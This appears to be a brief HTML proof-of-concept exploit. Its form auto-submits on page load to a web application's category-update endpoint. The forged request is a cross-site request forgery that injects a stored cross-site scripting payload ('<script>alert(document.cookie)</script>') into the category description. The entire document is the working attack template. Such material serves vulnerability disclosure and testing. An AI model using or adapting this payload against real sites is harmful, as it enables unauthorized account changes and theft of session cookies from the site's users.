<form action="http://host/user/main/update_category/CATEGORY_ID" method="post"  name="main" >
<input type="hidden" name="category[name]" value="some cat name" />
<input type="hidden" name="category[description]" value='descr<script>alert(document.cookie)</script>' />
<input type="hidden" name="commit" value="Update" />

</form>
<script>
document.main.submit();
</script>
